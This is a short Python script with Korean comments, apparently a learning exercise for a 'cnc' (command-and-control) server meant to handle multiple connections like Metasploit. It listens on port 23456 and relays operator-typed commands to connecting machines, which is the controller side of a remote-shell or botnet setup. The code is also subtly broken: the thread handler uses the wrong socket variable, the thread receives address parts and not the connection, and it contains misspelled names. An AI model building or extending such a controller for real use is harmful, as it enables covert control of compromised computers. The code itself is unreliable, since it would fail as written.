#cnc server -> 다중 접속으로 업데이트 metasploit 처

import socket
import threading

def handle_client(client_socket, addr):

    while True:
        #받은 데이터 출력 (보낼 때마다 받음)
        data = conn.recv(1024).decode()
        if data:
            print(data, end=' ')

        #바로 '>>' 다음 보낼 명령어 입력
        data = input()
        conn.send(data.encode())


    

addr = ('0.0.0.0', 23456)
with socket.socket() as s:  #소켓 객체 생성
    s.bind(addr)            #bind(host ip, port)
    s.listen(5)              #최대 5개의 클라이언트
    print('cnc server is started....')

    while True:
        try:
            conn, addr = s.accept() #시작하자마자 데이터 하나 받음('######~')
            print('Connect by', addr)
        except Excetpion as e:
            print(e)

        th = threading.Thread(target=handle_client, args=(addr[0], addr[1]))
        th.demon = True
        th.start()
        
print("{} is disconnected".format(addr))
